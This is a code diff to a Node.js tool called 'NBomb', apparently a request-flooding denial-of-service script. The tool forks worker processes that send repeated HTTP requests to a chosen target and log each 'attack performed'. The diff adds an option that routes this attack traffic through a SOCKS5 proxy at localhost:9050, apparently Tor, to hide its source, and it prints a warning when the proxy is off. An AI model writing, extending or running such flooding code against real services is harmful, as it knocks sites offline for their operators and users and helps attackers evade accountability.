@@ -6,6 +6,7 @@ import argv from "command-line-args";
 import commandLineUsage from "command-line-usage";
 import os from "os";
 import axios from "axios";
+import SocksProxyAgent from "socks-proxy-agent";
 
 import "@babel/polyfill";
 
@@ -34,6 +35,13 @@ if (cluster.isMaster) {
       type: Number,
       defaultValue: 1000,
       description: "amount to send attacks [default value is 1000]\n"
+    },
+    {
+      name: "proxy",
+      alias: "p",
+      type: Boolean,
+      defaultValue: false,
+      description: "socks5 proxy [localhost:9050]"
     },
     // {
     //   name: "interval",
@@ -72,6 +80,12 @@ if (cluster.isMaster) {
   console.log("NBomb Started");
   console.log("Reading options");
 
+  if (options.proxy) {
+    console.log(colors.green("On Proxy"));
+  } else {
+    console.log(colors.red("NOT USING PROXY!!!"));
+  }
+
   let clusters = [];
 
   // Fork workers.
@@ -98,10 +112,19 @@ if (cluster.isMaster) {
   }
 } else {
   process.on("message", msg => {
-    axios({
+    const axiosOptions = {
       url: msg.target,
       method: msg.method
-    })
+    };
+
+    const axiosProxyOptions = {
+      url: msg.target,
+      method: msg.method,
+      httpAgent: new SocksProxyAgent("socks5://127.0.0.1:9050"),
+      httpsAgent: new SocksProxyAgent("socks5://127.0.0.1:9050")
+    };
+
+    axios(msg.proxy ? axiosProxyOptions : axiosOptions)
       .then(() => {
         console.log(colors.green("attack performed ", colors.blue(msg.left)));
       })
